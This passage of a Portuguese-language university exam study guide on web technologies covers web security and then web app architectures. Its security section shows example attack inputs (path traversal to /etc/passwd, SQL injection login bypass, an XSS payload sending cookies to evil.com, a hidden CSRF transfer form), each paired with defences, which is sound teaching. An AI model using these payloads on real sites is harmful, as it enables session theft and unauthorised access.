Exploração de manipulação de caminhos de ficheiros com `../` para aceder a ficheiros fora do escopo.

```http
http://foo.com/page.php?page=../../etc/passwd
http://foo.com/viewimage.php?path=viewimage.php  <!-- ler source code -->
http://foo.com/.git/config  <!-- expor config do git -->
```

**Prevenção:**
```php
// ❌ Vulnerável
include($_GET['page']);

// ✅ Allowlist
$paginas_validas = ['home', 'sobre', 'contacto'];
$pagina = $_GET['page'] ?? 'home';
if (in_array($pagina, $paginas_validas)) {
  include($pagina . '.php');
} else {
  include('404.php');
}
```

- Servir apenas a pasta pública (`/public`)
- Nunca expor `.git`, `.env`, ficheiros de config via HTTP

---

### 10.3 SQL Injection

**O que é:** Injeção de código SQL através de input não sanitizado.

**Exemplos de ataque:**
```sql
-- Input: ' OR 1=1 --
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
-- Resultado: devolve todos os utilizadores!

-- Input para password: ' OR 1=1; --
SELECT * FROM users WHERE username = 'joao' AND password = '' OR 1=1; --'
-- Resultado: login sem password!
```

**Prevenção — SEMPRE usar Prepared Statements:**
```php
// ❌ VULNERÁVEL
$dbh->query("SELECT * FROM items WHERE owner = '" . $username . "'");

// ✅ SEGURO — prepared statement
$stmt = $dbh->prepare('SELECT * FROM items WHERE owner = ?');
$stmt->execute([$username]);

// ✅ Parâmetros nomeados
$stmt = $dbh->prepare('SELECT * FROM users WHERE username = :u AND password = :p');
$stmt->execute([':u' => $username, ':p' => $hashedPassword]);
```

---

### 10.4 XSS — Cross-Site Scripting

**O que é:** Injeção de scripts maliciosos numa página web que são executados no browser das vítimas.

**Tipos:**
| Tipo | Descrição |
|------|-----------|
| **Stored (Persistente)** | Script guardado no servidor (DB) e servido a todos |
| **Reflected** | Script refletido imediatamente na resposta (via URL/form) |
| **DOM-based** | Vulnerabilidade no JS do cliente que usa input inseguro |

**Exemplos:**
```html
<!-- Stored XSS: comentário guardado na DB -->
Comentário: <script>document.cookie; fetch('https://evil.com/?c='+document.cookie)</script>

<!-- Reflected XSS -->
http://foo.com/search.php?q=<script>alert('hacked')</script>

<!-- DOM-based XSS -->
```
```javascript
// Vulnerável
document.getElementById('result').innerHTML = location.search.get('q');
```

**Prevenção:**
```php
// SEMPRE escapar output
echo htmlspecialchars($texto, ENT_QUOTES, 'UTF-8');
echo htmlentities($texto, ENT_QUOTES, 'UTF-8');

// Para URLs
echo urlencode($valor);

// Validar/filtrar input
if (!preg_match('/^[a-zA-Z\s]+$/', $_GET['nome'])) {
  die('Nome inválido');
}
$nome = preg_replace('/[^a-zA-Z\s]/', '', $_GET['nome']);
```

```javascript
// Em JS — usar textContent em vez de innerHTML
element.textContent = userInput;  // seguro
element.innerHTML = userInput;    // PERIGOSO!

// Se precisar de HTML, usar escaping
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

**Mantra XSS:** *"filter input, encode output"*

**Mitigação com cookies:**
```php
// HttpOnly impede acesso via JavaScript
session_set_cookie_params([
  'httponly' => true,  // JS não pode aceder ao cookie
  'secure'   => true,  // só HTTPS
  'samesite' => 'Strict'
]);
```

---

### 10.5 CSRF — Cross-Site Request Forgery

**O que é:** Um site malicioso força o browser autenticado da vítima a fazer pedidos a outro site.

**Exemplo de ataque:**
```html
<!-- No site malicioso evil.com -->
<!-- Quando a vítima visita, faz uma transferência sem saber! -->
<img src="http://banco.com/transferir?amount=1000&dest=atacante"
     width="0" height="0">

<form action="http://banco.com/transferir" method="POST">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**O que NÃO funciona como proteção:**
- Cookies secretos
- Aceitar apenas POST
- Multi-step transactions

**Prevenção com Anti-CSRF Tokens:**
```php
// Gerar token
function gerar_token() {
  return bin2hex(openssl_random_pseudo_bytes(32));
}

// No início de cada sessão
session_start();
if (!isset($_SESSION['csrf'])) {
  $_SESSION['csrf'] = gerar_token();
}

// No formulário
<form action="transferir.php" method="post">
  <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
  <!-- outros campos -->
</form>

// Na ação POST
session_start();
if ($_SESSION['csrf'] !== $_POST['csrf']) {
  http_response_code(403);
  die('Token CSRF inválido');
}
// processar pedido...
```

---

### 10.6 Man-in-the-Middle e HTTPS

**MITM:** Atacante interceta e potencialmente modifica a comunicação entre cliente e servidor.

**Solução: HTTPS = HTTP + TLS/SSL**

**Como funciona:**
1. Browser obtém o **certificado** do servidor
2. Verifica que foi assinado por uma **CA (Certificate Authority)** de confiança
3. Extrai a **chave pública** do servidor
4. Usa criptografia assimétrica para trocar uma **chave simétrica** de sessão
5. Toda a comunicação é **encriptada** com a chave simétrica

**Certificados:**
- Ligam uma chave pública a uma organização
- Assinados por CAs (VeriSign, Let's Encrypt, ...)
- Browsers têm CAs pré-instaladas

---

### 10.7 Armazenamento Seguro de Passwords

**Nunca** guardar em plain text. Usar **hashing**.

**Problemas com hashes simples:**
- **Brute Force** — testar combinações
- **Rainbow Tables** — tabelas pré-computadas de hashes
- **Dictionary Attacks** — listas de passwords comuns

**Solução: Salt + Algoritmo lento (bcrypt)**
- **Salt** — string aleatória única por utilizador, combinada com a password antes de fazer hash
- **bcrypt** — algoritmo CPU-intensivo (mais lento = mais seguro)

**Em PHP (forma correta):**
```php
// Registar
$hash = password_hash($password, PASSWORD_DEFAULT, ['cost' => 12]);
// PASSWORD_DEFAULT usa bcrypt por padrão
// $hash inclui o algoritmo, custo e salt integrados

$stmt = $dbh->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
$stmt->execute([$username, $hash]);

// Autenticar
$stmt = $dbh->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password'])) {
  $_SESSION['user_id'] = $user['id'];
  // autenticado!
} else {
  // credenciais inválidas
}
```

**NÃO usar:**
```php
// ❌ Fraco
md5($password)
sha1($password)
hash('sha256', $password) // ainda sem salt próprio
```

**Regras:**
- Passwords enviadas **só via POST** (nunca GET)
- **Só via HTTPS**
- **Nunca encriptar no browser** (capturar o encrypted = capturar a password)
- Usernames/emails **case-insensitive**

---

## 11. MPA, SPA, PWA e Arquiteturas Web

### 11.1 MPA — Multi-Page Application (Clássica)

```
Utilizador → Pedido HTTP → Servidor gera HTML completo → Browser renderiza
```

- Cada interação carrega uma **página diferente**
- HTML gerado **completamente no servidor** (SSR — Server-Side Rendering)
- **Vantagens:** SEO facilitado, primeiro carregamento rápido, funciona sem JS
- **Desvantagens:** Lento (recarrega a página toda), código repetido entre páginas

---

### 11.2 AJAX — Modelo Híbrido

```
Utilizador → JS faz pedido AJAX → Servidor responde JSON/HTML parcial → JS atualiza DOM
```

- Páginas podem pedir **mais informação** sem recarregar
- Dados podem vir como **JSON** (rendering no cliente) ou **HTML** (rendering no servidor)
- Mais rápido; pode precisar de **código duplicado** (servidor + cliente)

---

### 11.3 SPA — Single-Page Application

```
Primeiro pedido → HTML + JS (app completa) → Todas as interações via AJAX + rendering no cliente
```

- Apenas um pedido HTML inicial; nunca recarrega a página
- Todas as interações são **AJAX** com **CSR** (Client-Side Rendering)
- **Vantagens:** Rápido após carregamento inicial, experiência de desktop, backend desacoplado
- **Desvantagens:** Primeiro carregamento lento, SEO difícil, quebra navegação padrão

**Não quebrar a Web — usar URL fragment:**
```javascript
// Guardar estado no fragment (#)
window.location.hash = '#artigo/42';

// Ler e reagir
function parse_fragment() {
  const hash = window.location.hash;
  const artigo = /#artigo\/(\d+)/.exec(hash);
  if (artigo) carregarArtigo(artigo[1]);
  else carregarListagem();
}

window.addEventListener('hashchange', parse_fragment);
parse_fragment(); // carregar estado inicial
```

**History API** (mais moderno):
```javascript
// Navegar sem recarregar
history.pushState({ pagina: 'home' }, '', '/home');
history.pushState({ id: 42 }, '', '/artigo/42');

// Reagir ao botão "Voltar"
window.addEventListener('popstate', (event) => {
  const estado = event.state;
  // restaurar estado baseado em event.state
});
```

---

### 11.4 CSR vs SSR

| | CSR (Client-Side Rendering) | SSR (Server-Side Rendering) |
|--|--|--|
| **Onde renderiza** | Browser (JavaScript) | Servidor (PHP/Node/...) |
| **Dados recebidos** | JSON/XML | HTML |
| **SEO** | Difícil | Fácil |
| **Primeiro carregamento** | Mais lento | Mais rápido |
| **Interatividade** | Imediata após JS carregar | Requer recarregamento |

**Negociação de conteúdo:**
```php
if ($_SERVER['HTTP_ACCEPT'] === 'application/json') {
  header('Content-Type: application/json');
  echo json_encode($dados);
} else {
  // renderizar HTML
  include('template.php');
}
```

---

### 11.5 Progressive Web Apps (PWA)

Apps web com capacidades próximas de apps nativas:

| Característica | Descrição |
|----------------|-----------|
| **Instalável** | Pode ser instalada no dispositivo |
| **Offline** | Funciona sem ligação (via cache) |
| **Responsiva** | Funciona em qualquer ecrã |
| **Web APIs** | Acesso a funcionalidades do dispositivo |

**Progressive Enhancement vs Graceful Degradation:**
- **Progressive Enhancement:** começa simples, adiciona funcionalidades para browsers melhores ✅
- **Graceful Degradation:** começa com tudo, degrada para browsers antigos

**Web App Manifest (`manifest.json`):**
```json
{
  "name": "Minha App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#336699",
  "icons": [
    { "src": "icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "icon-512.png", "sizes": "512x512", "type": "image/png" }
  ]
}
```

```html
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#336699">
```

---

### 11.6 Service Workers

Proxy que corre em background, intercepta pedidos de rede.

```javascript
// Registar service worker (em app.js)
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW registado'))
    .catch(err => console.error('Erro:', err));
}
```

```javascript
// sw.js — service worker
const CACHE_NAME = 'minha-app-v1';
const urlsParaCache = ['/', '/style.css', '/app.js', '/offline.html'];

// Evento install — cria cache
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME).then(cache => cache.addAll(urlsParaCache))
  );
});

// Evento activate — limpa caches antigas
self.addEventListener('activate', event => {
  event.waitUntil(
    caches.keys().then(keys =>
      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))
    )
  );
});

// Evento fetch — interceta pedidos
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(response => {
      // Cache first: devolve do cache ou busca da rede
      return response || fetch(event.request);
    })
  );
});
```

**Ciclo de vida do Service Worker:**
1. **install** — instalação (cache de recursos)
2. **waiting** — aguarda que tabs antigas fechem
3. **activate** — ativo, controla pedidos
4. **fetch** — interceta pedidos de rede

---

### 11.7 Web Workers

Scripts que correm em **threads separadas** (não bloqueiam o UI):

```javascript
// main.js
const worker = new Worker('worker.js');

worker.postMessage({ dados: [1, 2, 3, 4] });

worker.addEventListener('message', event => {
  console.log('Resultado:', event.data.resultado);
});

// worker.js
self.addEventListener('message', event => {
  const dados = event.data.dados;
  const resultado = dados.reduce((a, b) => a + b, 0);
  self.postMessage({ resultado });
});
```

**Limitações dos Workers:** não podem aceder ao DOM, `window`, ou `document`.

---

### 11.8 Web APIs Úteis

```javascript
// IndexedDB — armazenamento de dados estruturados no cliente
const request = indexedDB.open('minha-db', 1);

// Geolocalização
navigator.geolocation.getCurrentPosition(pos => {
  console.log(pos.coords.latitude, pos.coords.longitude);
});

// Clipboard
await navigator.clipboard.writeText('texto copiado');

// WebSocket — comunicação bidirecional com servidor
const ws = new WebSocket('wss://exemplo.com/socket');
ws.send('mensagem');
ws.onmessage = e => console.log(e.data);

// History API
history.pushState(state, title, url);
history.back();
history.forward();
window.addEventListener('popstate', e => console.log(e.state));

// localStorage e sessionStorage (ver secção 5.8)
```

---

### 11.9 Shadow DOM e Templates

```html
<!-- Template — não renderizado até ser clonado -->
<template id="user-template">
  <style>
    .username { font-weight: bold; color: navy; }
  </style>
  <div class="user">
    Olá, <span class="username"></span>!
  </div>
</template>
<div id="container"></div>
```

```javascript
function criarUserCard(nome, container) {
  const template = document.querySelector('#user-template');
  const userCard = document.createElement('div');
  
  // Shadow DOM — encapsula HTML/CSS (evita conflitos de estilo)
  const shadow = userCard.attachShadow({ mode: 'open' });
  const clone = template.content.cloneNode(true);
  
  clone.querySelector('.username').textContent = nome;
  shadow.appendChild(clone);
  container.appendChild(userCard);
}

criarUserCard('João Silva', document.querySelector('#container'));
```

---

### 11.10 Frameworks

**Full-stack:**
- **Laravel** (PHP) — ORM, autenticação, routing, templating Blade
- **Django** (Python) — ORM, admin, templates
- **Meteor** (JS/Node) — realtime

**Client-side:**
- **React** — componentes, estado, JSX
- **Vue** — diretivas, reatividade
- **Angular** — TypeScript, injeção de dependências
- **Svelte** — compila para JS puro, sem virtual DOM

**CSS:**
- **Bootstrap** — grid, componentes, utilidades
- **Tailwind** — utility-first
- **Pico CSS** — semântico/class-less

---

## 📝 Resumo para o Exame

### Armadilhas Comuns

| Situação | Erro Comum | Correto |
|---------|-----------|---------|
| Comparação JS | `==` (converte tipos) | `===` (estrito) |
| typeof null | "object" (bug histórico!) | verificar com `=== null` |
| Arrays em JS | `for...in` | `for...of` ou `.forEach()` |
| Input em PHP | concatenar em SQL | Prepared Statements |
| Output em PHP | echo direto | `htmlspecialchars()` |
| CSRF | só POST | token CSRF + POST |
| Passwords | MD5/SHA1 | `password_hash()` + `password_verify()` |
| Service Worker | acede ao DOM | não pode! |
| `var` em JS | escopo de função | usar `const`/`let` |
| Especificidade CSS | #id vs .classe | #id (1,0,0) > .classe (0,1,0) |

### Códigos HTTP para decorar

| 200 | 201 | 204 | 301 | 304 | 400 | 401 | 403 | 404 | 405 | 500 | 503 |
|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|
| OK | Created | No Content | Perm. Redirect | Not Modified | Bad Request | Unauthorized | Forbidden | Not Found | Method Not Allowed | Server Error | Unavailable |

### Seletores CSS — Especificidade

```
Universal (*)          → (0, 0, 0)
Elemento (p, div)      → (0, 0, 1)
Classe (.active)       → (0, 1, 0)
Pseudo-class (:hover)  → (0, 1, 0)
Atributo ([type])      → (0, 1, 0)
ID (#menu)             → (1, 0, 0)
Inline style           → (1, 0, 0, 0) — especificidade extra
!important             → supera tudo
```

### Regex — Referência Rápida

| Padrão | Significado |
|--------|-------------|
| `^...$` | string completa |
| `\d{9}` | exatamente 9 dígitos |
| `[a-zA-Z]+` | uma ou mais letras |
| `\w+@\w+\.\w{2,}` | email simples |
| `(?:https?\|ftp)://` | http, https ou ftp |
| `.+?` | qualquer coisa (lazy) |
| `(cat\|dog)s?` | gato/cão plural ou singular |

---

*Guia criado com base nas aulas de LTW do Prof. André Restivo · FEUP · 2025/2026*
